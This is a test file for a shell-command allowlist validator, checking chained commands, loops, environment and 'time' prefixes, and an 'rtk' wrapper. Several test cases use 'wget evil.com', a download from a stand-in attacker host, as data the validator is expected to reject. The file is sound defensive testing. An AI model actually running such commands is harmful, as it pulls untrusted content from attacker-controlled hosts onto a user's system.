import { isCommandLineAllowed } from '../isCommandLineAllowed.js';

describe('isCommandLineAllowed', () => {
  describe('validation logic', () => {
    it.each([
      // Single allowed command
      {
        commandLine: 'echo hello',
        allowList: ['echo'],
        expected: true,
      },
      // Single disallowed command
      {
        commandLine: 'wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      // Multiple commands all allowed
      {
        commandLine: 'echo hello && git status',
        allowList: ['echo', 'git'],
        expected: true,
      },
      // Multiple commands with one disallowed
      {
        commandLine: 'echo hello && wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      // Command name appears as argument (should be disallowed)
      {
        commandLine: 'echo grep',
        allowList: ['grep'],
        expected: false,
      },
      // With environment variables
      {
        commandLine: 'FOO=bar echo hello',
        allowList: ['echo'],
        expected: true,
      },
      // While loop with allowed commands
      {
        commandLine: 'while true; do echo hello; done',
        allowList: ['true', 'echo'],
        expected: true,
      },
      // While loop with disallowed command in body
      {
        commandLine: 'while true; do wget evil.com; done',
        allowList: ['true', 'echo'],
        expected: false,
      },
      // While loop missing condition command in allowlist
      {
        commandLine: 'while true; do echo hello; done',
        allowList: ['echo'],
        expected: false,
      },
      // For loop with allowed command
      {
        commandLine: 'for i in a b c; do echo $i; done',
        allowList: ['echo'],
        expected: true,
      },
      // For loop with disallowed command
      {
        commandLine: 'for i in a b c; do wget evil.com; done',
        allowList: ['echo'],
        expected: false,
      },
      // Time prefix with allowed command
      {
        commandLine: 'time echo hello',
        allowList: ['echo'],
        expected: true,
      },
      // Time prefix with disallowed command
      {
        commandLine: 'time wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      // rtk native subcommands accepted
      {
        commandLine: 'rtk --version',
        allowList: ['rtk --version'],
        expected: true,
      },
      {
        commandLine: 'rtk --help',
        allowList: ['rtk --help'],
        expected: true,
      },
      {
        commandLine: 'rtk rewrite "git status"',
        allowList: ['rtk rewrite'],
        expected: true,
      },
      {
        commandLine: 'rtk trust',
        allowList: ['rtk trust'],
        expected: true,
      },
      {
        commandLine: 'rtk config --create',
        allowList: ['rtk config'],
        expected: true,
      },
      // rtk native subcommand rejected when not allowlisted
      {
        commandLine: 'rtk --version',
        allowList: ['echo'],
        expected: false,
      },
      // rtk transparent wrapper behavior preserved (regression)
      {
        commandLine: 'rtk git status',
        allowList: ['git status'],
        expected: true,
      },
      {
        commandLine: 'rtk echo hello',
        allowList: ['echo'],
        expected: true,
      },
    ])(
      '$commandLine with $allowList',
      ({ commandLine, allowList, expected }) => {
        const actual = isCommandLineAllowed(commandLine, allowList);
        expect(actual).toBe(expected);
      },
    );
  });
});
